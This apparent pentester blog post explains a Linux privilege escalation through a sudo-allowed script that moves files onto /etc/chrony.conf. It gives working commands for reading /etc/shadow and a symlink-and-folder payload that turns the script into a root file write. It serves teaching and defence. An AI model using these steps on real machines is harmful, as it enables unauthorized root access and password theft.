---
layout: post
title: File Move to Privilege Escalation
date: 2021-08-22
tags: linux filesystem privesc
---

This post covers a PrivEsc that was found involving overlooked Linux filesystem and `mv` features.

## Overview

I was trying to finish up a chain of exploitation with a Linux PrivEsc. I had a web exploit that allowed RCE through the `nginx` user.
The typical `linPEAS.sh` scipt was ran but there was nothing interesting except for a handful of sudo NOPASSWD bash scripts.
The bash scripts ranged in length and complexity. They all aimed to perform "safe" root operation from `nginx`.

## Analysis

The following was a script that I'll refer to as `script.sh` that ended up being interesting.

```sh
#!/bin/bash

if [ -e /etc/chrony.conf~ ] ; then rm -f /etc/chrony.conf~ || : ; fi
mv -f /etc/chrony.conf /etc/chrony.conf~
mv "${1}" /etc/chrony.conf
chmod --reference=/etc/chrony.conf~ /etc/chrony.conf
chown --reference=/etc/chrony.conf~ /etc/chrony.conf
```

The script moves an `nginx` provided file to `/etc/chrony.conf` and applies the same permissions as the original file, which are `root`-based.
After looking online, `chrony.conf` seems to configure system time. How could this be broken?

## Arbitrary File Read

At first, I thought I could do a race-condition that would allow to provide any permission for `chrony.conf`.
Although being a valid issue, this is not particularly beneficial. What could be done with system time control?

Building off this idea, I checked out the `chrony.conf` permissions more closely:

```
-rw-r--r-- root root chrony.conf
```

The `chrony.conf` was world readable. This prompted me to pass `/etc/shadow` and see that the file was now readable through `/etc/chrony.conf`.
Root arbitrary file read! Just got to argue that passwords are weak and crackable and I had a full chain of exploitation.

## Arbitrary File Write

Obviously, I was not satisfied. There must be a way to allow a root arbitrary file write. I was wondering what I could provide and I remembered:

"Everything is a file in Linux" - Linux 101.

What if I provide a folder, symlink, device, etc? I can name any of these to `chrony.conf` and the filesystem will behave as expected.
After testing with various combinations, I found I could break the first line with a non-empty folder.

```sh
mkdir /etc/chrony.conf~
touch /etc/chrony.conf~/pwn
rm -f /etc/chrony.conf~
```
```
rm: cannot remove '/etc/chrony.conf~': Is a directory
```

The second line could also be broken if there was a folder at the destination.

```sh
mkdir /etc/chrony.conf~
mkdir /etc/chrony.conf~/chrony.conf
mv /etc/chrony.conf /etc/chrony.conf~
```
```
mv: cannot overwrite directory '/etc/chrony.conf~/chrony.conf' with non-directory
```

With the two previous issues, I could essentially "block in place" `/etc/chrony.conf` during the script. I could make the file various Linux file types.
What if I set `/etc/chrony.conf` as a symlink to `/tmp`?

```sh
ln -s /tmp /etc/chrony.conf
touch ./pwn
mv "./pwn" /etc/chrony.conf
ls /tmp
```

Notice how that `/tmp/pwn` now exists. `mv` considers the operation as a move to a folder and keeps the name.
For this example, we targeted `/tmp` but we could easily target `/etc` or even overwrite the `script.sh`.

Therefore, we can get Root Arbitrary File Write + Root PrivEsc through:

1) Making a malicious `/pwn/chrony.conf` folder and moving it with `script.sh`.

2) Making a symlink to a target destination and moving it with `script.sh`.

3) Making a payload with the target file name and moving it with `script.sh`.

4) Profit.

This resulting payload is roughly following:

```sh
# 1
mkdir ./pwn
mkdir ./pwn/chrony.conf
./script.sh ./pwn/chrony.conf
# 2
ln -s /path/to/pwn_file ./pwn
./script.sh ./pwn
# 3
touch pwn_file
./script.sh ./pwn_file
# 4
ls /path/to
```

Note that this payload leads to "broken" system permissions because of the last two lines.
There is definitely a way to take advantage of those behaviors, I'll let you explore!

## Summary

Linux and `mv` can behave unpredictably at times.

For developers, make sure to validate user input files no matter the source.
Users will always end up willingly or unwillingly sending you input that you won't expect.

For pentesters, folders and symlinks can be interesting to send if you have a foothold in a machine.
Additionally, sometimes overlooked "basic" features can be the most dangerous.
